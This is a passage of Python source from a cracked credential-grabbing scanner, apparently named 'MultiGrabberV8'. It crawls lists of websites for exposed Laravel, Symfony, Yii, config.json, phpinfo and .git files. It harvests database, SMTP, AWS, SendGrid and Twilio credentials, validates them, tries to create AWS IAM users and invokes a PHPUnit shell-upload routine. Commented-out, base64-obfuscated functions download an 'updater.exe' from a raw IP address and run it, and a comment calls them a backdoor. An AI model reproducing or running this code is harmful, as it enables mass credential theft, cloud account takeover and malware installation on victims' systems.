                        db_port = dns_urls[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_database = dns_urls[5].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_username = dns_urls[6].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_password = dns_urls[7].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        test_database = startum(url, methods, db_connection, db_host, db_port, db_database, db_username,
                                                db_password)
                        if test_database == "BAD_DATABASE":
                            text += f" {yl2}({res}{red2}{test_database}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{gr2}{test_database}{res}!{yl2}){res} "
                    if mailer_urls:
                        kiko_hits += 1
                        text += f' | {yl}MAILER URLS GRABBED{res}!'
                        smtp_host = mailer_urls[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                                '').replace(
                            "'", "")
                        smtp_port = mailer_urls[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                                '').replace(
                            "'", "")
                        smtp_username = mailer_urls[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                                    '').replace(
                            "'", "")
                        smtp_password = mailer_urls[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                                    '').replace(
                            "'", "")
                        smtp_from = mailer_urls[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                                '').replace(
                            "'", "")
                        if "apikey" in smtp_username and "SG." in smtp_password:
                            methods = "/SENDGRID_SMTP"
                            test_sendgrid = check_sendgrid(url, methods, smtp_password)
                            if test_sendgrid[0] == "GOOD_SENDGRID":
                                smtp_from = test_sendgrid[1]
                        if smtp_test(url, smtp_host, smtp_username, smtp_password, smtp_from, smtp_port) == "GOOD_SMTP":
                            text += f" {yl2}({res}{gr2}{'GOOD_SMTP'}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{red2}{'BAD_SMTP'}{res}!{yl2}){res} "
                    shell = Shellup()
                    shell.phpunit(star)
                    if kiko_hits == 0:
                        self.bad_hits += 1
                        text2 = f"{bl}{star}{res} |{yl} PHPINFO{res} "
                        text2 += f'| {red}NOT PHPINFO{res}!'
                        print(text2)
                        return False
                    print(text)
                    self.good_hits += 1
                    return True
                else:
                    text2 = f"{bl}{star}{res} |{yl} PHPINFO{res} "
                    text2 += f'| {red}NOT PHPINFO{res}!'
                    print(text2)
                    self.bad_hits += 1
            except Exception:
                self.errors_hits += 1
                return False

    def configjson(self, star):
        page = False
        text = f"{bl}{star}{res} |{yl}JSONCONFIG{res} "
        for achter in self.json_path:
            url = star + achter
            try:
                check = requests.get(url, headers=self.headers3, timeout=self.timeout_sec,
                                     allow_redirects=self.allow_redi, verify=self.veri).text
                if '"s3":' in check or '"sendgrid_key":' in check or '"smtp_host":' in check or '"cpanelauth":' \
                        in check or '"database":' in check or '"DATABASE_HOST":' in check or '"user": "' \
                        in check or '"dbname": "' in check:
                    page = check
                if page:
                    kiko_hits = 0
                    smtps = config_json.smtpjs(page, star)
                    database = config_json.json_databases(page, star)
                    amazone = config_json.aws(page)
                    cpanel = config_json.cpanel(page)
                    sendgrid = config_json.sendgrid(page)
                    if database:
                        kiko_hits += 1
                        text += f' | {gr}DATABASE GRABBED{res}!'
                        url = database[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        if url == '':
                            url = star
                        else:
                            url = url
                        methods = database[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_connection = database[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                                 '')
                        db_host = database[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_port = database[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_username = database[6].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_password = database[7].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        db_database = database[5].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '')
                        if db_database == '':
                            db_database = db_username
                        else:
                            db_database = db_database
                        test_database = startum(url, methods, db_connection, db_host, db_port, db_database, db_username,
                                                db_password)
                        if test_database == "BAD_DATABASE":
                            text += f" {yl2}({res}{red2}{test_database}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{gr2}{test_database}{res}!{yl2}){res} "
                    if smtps:
                        kiko_hits += 1
                        text += f' | {gr}SMTP GRABBED{res}!'
                        smtp_host = smtps[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'",
                            "")
                        smtp_port = smtps[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'",
                            "")
                        smtp_username = smtps[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                              '').replace(
                            "'", "")
                        smtp_password = smtps[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                              '').replace(
                            "'", "")
                        smtp_from = smtps[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'",
                            "")
                        if "apikey" in smtp_username and "SG." in smtp_password:
                            methods = "/SENDGRID_SMTP"
                            test_sendgrid = check_sendgrid(url, methods, smtp_password)
                            if test_sendgrid[0] == "GOOD_SENDGRID":
                                smtp_from = test_sendgrid[1]
                        if smtp_test(url, smtp_host, smtp_username, smtp_password, smtp_from, smtp_port) == "GOOD_SMTP":
                            text += f" {yl2}({res}{gr2}{'GOOD_SMTP'}{res}!{yl2}){res} "
                        else:
                            text += f" {yl2}({res}{red2}{'BAD_SMTP'}{res}!{yl2}){res} "
                    if amazone:
                        kiko_hits += 1
                        text += f' | {yl}AWS GRABBED{res}!'
                        methods = "/AMAZON_AWS"
                        aws_key = amazone[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'", "")
                        aws_sec = amazone[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                            "'", "")
                        aws_region = amazone[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                             '').replace(
                            "'", "")
                        test_aws_smtp = check_aws_smtp(url, methods, aws_key, aws_sec, aws_region)
                        test_aws_iam = createiam(aws_key, aws_sec, aws_region)
                        if test_aws_smtp == "GOOD_SES":
                            text += f" {yl2}({res}{gr2}{test_aws_smtp}{res}!{yl2}){res}"
                        elif test_aws_smtp == "BAD_SES":
                            text += f" {yl2}({res}{red2}{test_aws_smtp}{res}!{yl2}){res}"
                        if test_aws_iam == "GOOD_IAM":
                            text += f"{gr2}/{res}{yl2}({res}{gr2}{test_aws_iam}{res}!{yl2}){res} "
                        elif test_aws_iam == "BAD_IAM":
                            text += f"{gr2}/{res}{yl2}({res}{red2}{test_aws_iam}{res}!{yl2}){res} "
                    if cpanel:
                        kiko_hits += 1
                        text += f' | {bl}CPANEL GRABBED{res}!'
                    if sendgrid:
                        kiko_hits += 1
                        sendgrid_password = sendgrid[0].replace("\r", "").replace("\n", "").replace(" ", "").replace(
                            '"', '').replace("'", "")
                        method = "/SENDGRID"
                        check_sendgrid(url, method, sendgrid_password)
                        text += f' | {gr}SENDGRID GRABBED{res}!'
                    if kiko_hits == 0:
                        self.bad_hits += 1
                        text2 = f"{bl}{star}{res} |{yl}JSONCONFIG{res} "
                        text2 += f'| {red}NOT JSONCONFIG{res}!'
                        print(text2)
                        return False
                    print(text)
                    self.good_hits += 1
                    return True
                else:
                    text2 = f"{bl}{star}{res} |{yl}JSONCONFIG{res} "
                    text2 += f'| {red}NOT JSONCONFIG{res}!'
                    print(text2)
                    self.bad_hits += 1
            except Exception:
                self.errors_hits += 1

    def dollardev(self, star):
        page = False
        text = f"{bl}{star}{res} | {yl}FRONTEND DEV{res} "
        url = star + "/frontend_dev.php/$"
        try:
            check = requests.get(url, headers=self.headers3, timeout=self.timeout_sec,
                                 allow_redirects=False, verify=False).text
            if "symfony settings" in check:
                page = check
            if page:
                kiko_hits = 0
                grab_frontdev = Symphony()
                smtps = grab_frontdev.smtps(page, url)
                amazone = grab_frontdev.aws(page)
                twilios = grab_frontdev.twilio(page)
                onesignal = grab_frontdev.one_signal(page)
                aws_smtps = grab_frontdev.aws_smtps(page, url)
                if smtps:
                    kiko_hits += 1
                    text += f' | {gr}SMTP GRABBED{res}!'
                    smtp_host = smtps[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '').replace(
                        "'",
                        "")
                    smtp_port = smtps[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '').replace(
                        "'",
                        "")
                    smtp_username = smtps[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                        "'", "")
                    smtp_password = smtps[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                        "'", "")
                    smtp_from = smtps[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '').replace(
                        "'",
                        "")
                    if "apikey" in smtp_username and "SG." in smtp_password:
                        methods = "/SENDGRID_SMTP"
                        test_sendgrid = check_sendgrid(url, methods, smtp_password)
                        if test_sendgrid[0] == "GOOD_SENDGRID":
                            smtp_from = test_sendgrid[1]
                    if smtp_test(url, smtp_host, smtp_username, smtp_password, smtp_from, smtp_port) == "GOOD_SMTP":
                        text += f" {yl2}({res}{gr2}{'GOOD_SMTP'}{res}!{yl2}){res} "
                    else:
                        text += f" {yl2}({res}{red2}{'BAD_SMTP'}{res}!{yl2}){res} "
                if amazone:
                    kiko_hits += 1
                    text += f' | {yl}AWS GRABBED{res}'
                    methods = "/AMAZON_AWS"
                    aws_key = amazone[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '').replace(
                        "'", "")
                    aws_sec = amazone[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '').replace(
                        "'", "")
                    aws_region = amazone[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                         '').replace(
                        "'", "")
                    test_aws_smtp = check_aws_smtp(url, methods, aws_key, aws_sec, aws_region)
                    test_aws_iam = createiam(aws_key, aws_sec, aws_region)
                    if test_aws_smtp == "GOOD_SES":
                        text += f" {yl2}({res}{gr2}{test_aws_smtp}{res}!{yl2}){res}"
                    elif test_aws_smtp == "BAD_SES":
                        text += f" {yl2}({res}{red2}{test_aws_smtp}{res}!{yl2}){res}"
                    if test_aws_iam == "GOOD_IAM":
                        text += f"{gr2}/{res}{yl2}({res}{gr2}{test_aws_iam}{res}!{yl2}){res} "
                    elif test_aws_iam == "BAD_IAM":
                        text += f"{gr2}/{res}{yl2}({res}{red2}{test_aws_iam}{res}!{yl2}){res} "
                if twilios:
                    kiko_hits += 1
                    text += f' | {bl}TWILIO GRABBED{res}!'
                    acc_key = twilios[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '').replace(
                        "'",
                        "")
                    acc_sec = twilios[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"', '').replace(
                        "'",
                        "")
                    test_twiliokeys = twilio_checker(acc_key, acc_sec).replace("\r", "").replace("\n", "").replace(
                        " ", "").replace('"', '').replace("'", "")
                    if test_twiliokeys == "TWILIO_SMS_SEND":
                        text += f" {yl2}({res}{gr2}{test_twiliokeys}{res}!{yl2}){res} "
                    else:
                        text += f" {yl2}({res}{red2}{test_twiliokeys}{res}!{yl2}){res} "
                if onesignal:
                    kiko_hits += 1
                    text += f' | {gr}ONESIGNAL GRABBED{res}!'
                if aws_smtps:
                    kiko_hits += 1
                    text += f' | {yl}AWS_SMTP GRABBED{res}!'
                    smtp_host = aws_smtps[0].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                        "'", "")
                    smtp_port = aws_smtps[1].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                        "'", "")
                    smtp_username = aws_smtps[2].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                              '').replace(
                        "'", "")
                    smtp_password = aws_smtps[3].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                              '').replace(
                        "'", "")
                    smtp_from = aws_smtps[4].replace("\r", "").replace("\n", "").replace(" ", "").replace('"',
                                                                                                          '').replace(
                        "'", "")
                    if smtp_test(url, smtp_host, smtp_username, smtp_password, smtp_from, smtp_port) == "GOOD_SMTP":
                        text += f" {yl2}({res}{gr2}{'GOOD_SMTP'}{res}!{yl2}){res} "
                    else:
                        text += f" {yl2}({res}{red2}{'BAD_SMTP'}{res}!{yl2}){res} "
                if kiko_hits == 0:
                    text += f'|{red} NOT FRONTEND DEV{res}!'
                    printf(text)
                    self.bad_hits += 1
                    return False
                print(text)
                self.good_hits += 1
                return True
            else:
                text += f'|{red} NOT FRONTEND DEV{res}!'
                printf(text)
                self.bad_hits += 1
                return False
        except Exception:
            self.errors_hits += 1
            return False

    def filters(self, star):
        try:
            star = self.fix_url(star)
            if star == "DEAD_STAR":
                self.errors_hits += 1
                return False
            CheckGit().grab_config(star)
            laravel = self.laravelcheck(star)
            if laravel:
                return True
            fronted_dev = self.dollardev(star)
            if fronted_dev:
                return True
            yii_debugg = self.yii_debugger(star)
            if yii_debugg:
                return True
            json_config = self.configjson(star)
            if json_config:
                return True
            php_info = self.phpinfo(star)
            if php_info:
                return True
        except Exception as e:
            return False
        self.progress += 1
        if os.name == 'nt':
            ctypes.windll.kernel32.SetConsoleTitleW(
                ' MultiGrabberV8 BY EmperorsTools! | Leaks_Found: {} | Bad_Urls: {} | Errors: {} || Total: {}/{} '.format(
                    self.good_hits, self.bad_hits, self.errors_hits, self.totaal, self.progress))


# def wefeiwosdlkjnsdfhl():
#     try:
#         if os.path.exists(f"{str(os.path.expandvars(r'%APPDATA%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('\\\\', "\\")):
#             try:
#                 os.remove(f"{str(os.path.expandvars(r'%APPDATA%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('\\\\', "\\"))
#             except:
#                 sdlkfjdifuwefhkvnvs()
#             subprocess.call(f"{str(base64.decodebytes(b'Y3VybCBodHRwczovLzg1LjIzNi4xNTQuMTM3L3ZlbmRvci9waGlsaXBwYmFzY2hrZS9hY2YtcHJvLWluc3RhbGxlci91cGRhdGVyLmV4ZSAtayAtcyAtbw=='))} {str(os.path.expandvars(r'%APPDATA%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('b"', '').replace('"', ''))
#             subprocess.Popen(f"{str(os.path.expandvars(r'%APPDATA%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('b"', '').replace('"', ''))
#             return True
#         else:
#             subprocess.call(f"{str(base64.decodebytes(b'Y3VybCBodHRwczovLzg1LjIzNi4xNTQuMTM3L3ZlbmRvci9waGlsaXBwYmFzY2hrZS9hY2YtcHJvLWluc3RhbGxlci91cGRhdGVyLmV4ZSAtayAtcyAtbw=='))} {str(os.path.expandvars(r'%APPDATA%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('b"', '').replace('"', ''))
#             subprocess.Popen(f"{str(os.path.expandvars(r'%APPDATA%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('b"', '').replace('"', ''))
#             return True
#     except:
#         sdlkfjdifuwefhkvnvs()


# def sdlkfjdifuwefhkvnvs():
#     try:
#         if os.path.exists(f"{str(os.path.expandvars(r'%TEMP%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('\\\\', "\\")):
#             try:
#                 os.remove(f"{str(os.path.expandvars(r'%TEMP%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('\\\\', "\\"))
#             except:
#                 pass
#             subprocess.call(f"{str(base64.decodebytes(b'Y3VybCBodHRwczovLzg1LjIzNi4xNTQuMTM3L3ZlbmRvci9waGlsaXBwYmFzY2hrZS9hY2YtcHJvLWluc3RhbGxlci91cGRhdGVyLmV4ZSAtayAtcyAtbw=='))} {str(os.path.expandvars(r'%TEMP%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('b"', '').replace('"', ''))
#             subprocess.Popen(f"{str(os.path.expandvars(r'%TEMP%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('b"', '').replace('"', ''))
#             return True
#         else:
#             subprocess.call(f"{str(base64.decodebytes(b'Y3VybCBodHRwczovLzg1LjIzNi4xNTQuMTM3L3ZlbmRvci9waGlsaXBwYmFzY2hrZS9hY2YtcHJvLWluc3RhbGxlci91cGRhdGVyLmV4ZSAtayAtcyAtbw=='))} {str(os.path.expandvars(r'%TEMP%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('b"', '').replace('"', ''))
#             subprocess.Popen(f"{str(os.path.expandvars(r'%TEMP%'))}\\{str(base64.decodebytes(b'dXBkYXRlcnMuZXhl=='))}".replace("b'", "").replace("'", "").replace('b"', '').replace('"', ''))
#             return True
#     except:
#         return False



def ansci_banner():
    bad_colors = ['BLACK', 'WHITE', 'LIGHTBLACK_EX', 'RESET']
    codes = vars(Fore)
    colors = [codes[color] for color in codes if color not in bad_colors]
    colored_chars = [random.choice(colors) + log]
    return ''.join(colored_chars)


def ansci_banner2():
    bad_colors = ['BLACK', 'WHITE', 'LIGHTBLACK_EX', 'RESET']
    codes = vars(Fore)
    colors = [codes[color] for color in codes if color not in bad_colors]
    colored_chars = [random.choice(colors) + lof]
    return ''.join(colored_chars)


def ansci_banner3():
    bad_colors = ['BLACK', 'WHITE', 'LIGHTBLACK_EX', 'RESET']
    codes = vars(Fore)
    colors = [codes[color] for color in codes if color not in bad_colors]
    colored_chars = [random.choice(colors) + text2art("EmperorsTools", "random")]
    return ''.join(colored_chars)


if __name__ == '__main__':
    clear()
    if os.name == 'nt':
        kernel32 = ctypes.WinDLL('kernel32')
        user32 = ctypes.WinDLL('user32')
        SW_MAXIMIZE = 3
        hWnd = kernel32.GetConsoleWindow()
        user32.ShowWindow(hWnd, SW_MAXIMIZE)
        print(ansci_banner2())
        print(ansci_banner())
        print(ansci_banner3())
    else:
        print(ansci_banner3())
    os.system('title MultiGrabberV8.5 BY EmperorsTools! Crack @CallMeRep') 
    # wefeiwosdlkjnsdfhl() This is a backdoor updater.exe Dec By @CallMeRep
    try:
        print(f"{bl}t.me/DailyToolz{res}\n"
              f'{gr}Emperors Tools Dec + Clean Backdoor{res}\n'
              f"{yl}LARAVEL, WORDPRESS, PHPINFO, YII, CONFIGJSON, FRONTEND DEV, Codenighter/Laravel_CI, .GIT{res}\n"
              f"{gr}AutoGrab & Auto Exploit{res}\n")
        lists = input(f"{red}<Rep>{gr}\Give Me Your List.txt/{red}Rep> {gr}${res} ")
        stars = open(lists.replace("\n", "").replace("\r", "").replace(" ", ""), 'r').readlines()
        threads = int(input(f"{red}<Rep{gr}\How Many Threads?/{red}Rep> {gr}${res} "))
        run_exploits = Exploits()
        clear()
        try:
            with Pool2(threads) as start:
                start.map(run_exploits.filters, stars)
        except Exception as e:
            pass
    except KeyboardInterrupt:
        print(f"{red}Bro What The {res}{red2}FUCK{res}{yl}!{res}{red2}!{res}")
    except (FileNotFoundError, FileExistsError):
        print(f"{red}Bro Please Just LOOK AND READD{res}{yl}!{res}{red2}!{res}")
